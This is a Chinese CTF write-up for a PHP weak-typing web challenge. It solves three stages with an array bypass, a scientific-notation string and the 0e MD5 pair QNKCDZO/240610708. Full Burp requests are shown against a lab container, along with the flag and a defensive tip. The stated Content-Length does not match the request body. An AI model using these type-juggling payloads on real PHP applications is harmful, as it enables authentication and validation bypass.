# PHP 三关（PHP 弱类型）— Writeup

**题目类别：** Web / PHP  
**目标：** `http://103.163.47.230:32849/`（动态容器）  
**Flag：** `HTUCTF{6b60ba96-3899-4131-9816-ba0225b42741}`

## 题目分析

源码三关，每关放一个字符/字符串进 `$_GET` / `$_POST`，全部通过后吐 flag。三关分别考：

1. **数组绕过** —— 严格比较 + 弱比较的组合
2. **数字字符串的科学计数法** —— `strlen` 与数值比较的矛盾
3. **`0e` 纯数字 MD5 碰撞** —— 弱类型 `==`

## 第一关：数组绕过

```php
if ($_GET['a'] !== "admin") {        // ① 严格比较：类型不同即成立
    if ($_GET['a'][0] == "admin") {  // ② 取数组首元素，弱比较
```

一个字符串想同时满足"严格不等于 admin"和"等于 admin"是不可能的，但**数组**可以：传 `a[]=admin` 后 `$_GET['a']` 是 `array("admin")`。

- ① `array !== "admin"` → 类型不同 → **成立**，进入下一层；
- ② `$_GET['a'][0]` 取出首元素字符串 `"admin"`，`"admin" == "admin"` → **成立**。

```
GET /?a[]=admin
```

这就是 PHP 弱类型题的经典起手式：**用数组绕过严格比较，再用下标取回原值过弱比较**。

## 第二关：科学计数法

```php
$num = $_GET['num'];
if (strlen($num) < 5 && $num > 10000) { ... }
```

`strlen()` 按**字符串长度**算，`>` 按**数值**算。要长度小于 5、数值大于 10000：

```
1e9
```

- `strlen("1e9")` = 3 < 5 ✔
- `"1e9" > 10000` → PHP 把 `"1e9"` 转成 float `1.0e9` = 1000000000 > 10000 ✔

（同理 `1e5`、`9e9` 都行，取 `1e9` 即可。）

## 第三关：`0e` MD5 碰撞

```php
if (md5($_POST['x']) == md5($_POST['y'])) { ... }
```

要找两个串，其 MD5 都是 `0e` 开头的**纯数字**形式——PHP 弱比较会把 `0e...` 当科学计数法，`0e anything == 0e anything2` 都等于 0。

经典碰撞对：

```
md5("QNKCDZO")    = 0e830400451993494058024219903391
md5("240610708")  = 0e462097431906509019562988736854
```

两个都是 `0e` + 30 位纯数字，`==` 判定为真。

## Burp 复现（完整报文）

> 目标 `103.163.47.230:32849`，换容器只改 `Host`。
> 三关分别对应 `GET ?a[]=`、`GET ?num=`、`POST x/y`，**可以在一条请求里一次带齐**。

### 逐关验证

**第一关（数组绕过）**

```http
GET /?a%5B%5D=admin HTTP/1.1
Host: 103.163.47.230:32849
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

`a[]=admin` 使 `$_GET['a']` 变成 `array("admin")`：
`$a !== "admin"`（类型不同，成立）且 `$a[0] == "admin"`（取回首元素，成立）。

**第二关（科学计数法）**

```http
GET /?num=1e9 HTTP/1.1
Host: 103.163.47.230:32849
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

`strlen("1e9")` = 3 < 5，而 `"1e9" > 10000` 时 PHP 转成 float `1.0e9`。

**第三关（`0e` MD5 碰撞）**

```http
POST / HTTP/1.1
Host: 103.163.47.230:32849
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close

x=QNKCDZO&y=240610708
```

`md5("QNKCDZO") = 0e830400451993494058024219903391`、
`md5("240610708") = 0e462097431906509019562988736854`，
两个都是 `0e` + 纯数字，弱比较 `==` 时都被当成 0。

### 一次带齐（最终报文）

三关的条件可以塞进**同一个请求**：query 带 `a[]` 和 `num`，body 带 `x` / `y`。

```http
POST /?a%5B%5D=admin&num=1e9 HTTP/1.1
Host: 103.163.47.230:32849
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close

x=QNKCDZO&y=240610708
```

Response 里直接含 flag：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... HTUCTF{6b60ba96-3899-4131-9816-ba0225b42741} ...
```

> Repeater 里改方法：请求区右键 → **Change request method** → POST（会自动补 Content-Type）。
> `[]` 在 URL 里建议编码成 `%5B%5D`，避免个别代理改写。

## 三关知识点小结

| 关 | 考点 | 解法 |
|---|---|---|
| 1 | 数组 vs 字符串的严格/弱比较 | `a[]=admin` |
| 2 | `strlen` 按字符、`>` 按数值 | `num=1e9` |
| 3 | `0e` 纯数字 MD5 弱比较 | `QNKCDZO` / `240610708` |

> 防御提示：涉及比较一律用 `===`/`hash_equals()`；校验数字用 `ctype_digit()` + 显式类型转换；密码/令牌比对禁用 `==`。
